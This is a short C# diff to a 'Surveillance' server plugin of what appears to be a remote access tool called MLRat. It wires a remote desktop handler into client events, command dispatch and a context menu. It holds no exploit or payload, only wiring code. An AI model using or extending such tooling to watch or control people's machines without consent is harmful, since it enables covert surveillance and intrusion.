@@ -27,11 +27,13 @@ namespace MLSurveillanceServer
         public void OnClientConnect(IClient client)
         {
             RemoteChatHandler.NewClient(client);
+            RemoteDesktopHandler.NewClient(client);
         }
 
         public void OnClientDisconnect(IClient client)
         {
             RemoteChatHandler.ClientDisconnect(client);
+            RemoteDesktopHandler.Disconnect(client);
         }
 
         public void OnDataRetrieved(IClient client, object[] data)
@@ -41,6 +43,9 @@ namespace MLSurveillanceServer
             {
                 case NetworkCommand.RemoteChat:
                     RemoteChatHandler.Handle(client, data);
+                    break;
+                case NetworkCommand.RemoteDesktop:
+                    RemoteDesktopHandler.Handle(client, data);
                     break;
             }
         }
@@ -52,13 +57,19 @@ namespace MLSurveillanceServer
                 Text = "Remote Chat",
                 OnClick = RemoteChatHandler.ContextCallback
             };
+            var remoteDesktopContextEntry = new MLRatContextEntry()
+            {
+                Text = "Remote Desktop",
+                OnClick = RemoteDesktopHandler.ContextCallback
+            };
 
             UIHost.AddContext(new MLRatContextEntry()
             {
                 Text = "Surveillance",
                 SubMenus = new MLRatContextEntry[]
                 {
-                    remoteChatContext
+                    remoteChatContext,
+                    remoteDesktopContextEntry
                 }
             });
         }
